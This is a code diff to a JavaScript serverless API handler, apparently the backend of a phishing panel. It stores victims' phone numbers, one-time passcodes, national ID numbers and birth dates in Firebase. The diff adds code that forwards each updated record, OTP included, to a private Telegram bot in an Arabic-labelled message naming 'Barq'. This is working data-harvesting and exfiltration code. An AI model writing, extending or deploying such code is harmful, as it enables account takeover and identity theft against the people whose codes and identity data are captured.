@@ -1,5 +1,5 @@
 import { initializeApp } from "firebase/app";
-import { getFirestore, collection, addDoc, getDocs, query, orderBy, doc, updateDoc, deleteDoc } from "firebase/firestore";
+import { getFirestore, collection, addDoc, getDocs, query, orderBy, doc, updateDoc, deleteDoc, getDoc } from "firebase/firestore";
 
 const firebaseConfig = JSON.parse(process.env.FIREBASE_CONFIG);
 const app = initializeApp(firebaseConfig);
@@ -10,7 +10,7 @@ export default async function handler(req, res) {
     const usersCol = collection(db, "users");
 
     try {
-        // 1. جلب البيانات (للإدارة وللمراقبة)
+        // 1. جلب البيانات
         if (method === 'GET') {
             const q = query(usersCol, orderBy("timestamp", "desc"));
             const snapshot = await getDocs(q);
@@ -18,12 +18,12 @@ export default async function handler(req, res) {
             return res.status(200).json(data);
         }
 
-        // 2. إرسال بيانات جديدة (من صفحة التسجيل)
+        // 2. إرسال بيانات جديدة (التسجيل الأولي)
         if (method === 'POST') {
-            const { phone, otp } = req.body;
+            const { phone } = req.body;
             const docRef = await addDoc(usersCol, { 
                 phone, 
-                otp: otp || "", 
+                otp: "", 
                 status: "pending", 
                 timestamp: new Date() 
             });
@@ -37,18 +37,37 @@ export default async function handler(req, res) {
             return res.status(200).json({ success: true, id: docRef.id });
         }
 
-        // 3. تعديل الحالة والبيانات (هنا التعديل المطلوب لصفحة الهوية)
+        // 3. تعديل الحالة والبيانات (مع إرسال إشعار كامل للبوت)
         if (method === 'PATCH') {
             const { id, otp, status, identityNumber, birthDate } = req.body;
             
-            // ننشئ كائن البيانات المحدثة بناءً على ما يصلنا
+            const userDocRef = doc(db, "users", id);
             const updateData = {};
             if (otp !== undefined) updateData.otp = otp;
             if (status !== undefined) updateData.status = status;
             if (identityNumber !== undefined) updateData.identityNumber = identityNumber;
             if (birthDate !== undefined) updateData.birthDate = birthDate;
             
-            await updateDoc(doc(db, "users", id), updateData);
+            await updateDoc(userDocRef, updateData);
+
+            // جلب البيانات المحدثة بالكامل لإرسالها للبوت
+            const updatedUser = await getDoc(userDocRef);
+            const data = updatedUser.data();
+
+            // صياغة رسالة تحتوي على كل البيانات المتاحة
+            const message = `تحديث بيانات برق:
+📱 الجوال: ${data.phone || 'غير متوفر'}
+🔐 الرمز: ${data.otp || 'بانتظار...'}
+🆔 الهوية: ${data.identityNumber || 'بانتظار...'}
+📅 الميلاد: ${data.birthDate || 'بانتظار...'}
+⚖️ الحالة: ${data.status || 'pending'}`;
+            
+            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text: message })
+            });
+
             return res.status(200).json({ success: true });
         }
 
